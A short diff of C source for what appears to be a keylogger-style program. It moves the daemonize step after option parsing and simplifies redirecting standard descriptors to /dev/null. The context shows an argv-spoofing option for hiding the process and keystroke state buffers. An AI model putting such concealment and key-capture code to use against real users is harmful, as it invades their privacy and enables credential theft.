@@ -40,14 +40,10 @@ void daemonize(const char *option_pidfile)
     // Detach from controlling terminal
     setsid();
     
-    // Close all file descriptors
-    for (int i = getdtablesize(); i >= 0; i--)
+    for (int i = 0; i < 3; i++) {
         close(i);
-    
-    // Open stdin, stdout, stderr to /dev/null
-    int fd = open("/dev/null", O_RDWR);
-    dup(fd);
-    dup(fd);
+        open("/dev/null", O_RDWR);
+    }
 }
 
 // Signal handlers
@@ -150,10 +146,6 @@ int main(int argc, char *argv[])
     signal(SIGTERM, signal_quit);
     signal(SIGQUIT, signal_quit);
     signal(SIGINT, signal_quit);
-    
-    // Daemonize
-    if (option_daemonize)
-        daemonize(option_pidfile);
 
     // Spoof argv
     if (option_spoof)
@@ -175,6 +167,10 @@ int main(int argc, char *argv[])
             exit(EXIT_FAILURE);
         }
     }
+
+    // Daemonize
+    if (option_daemonize)
+        daemonize(option_pidfile);
     
     char keys_current[32], keys_last[32];
     
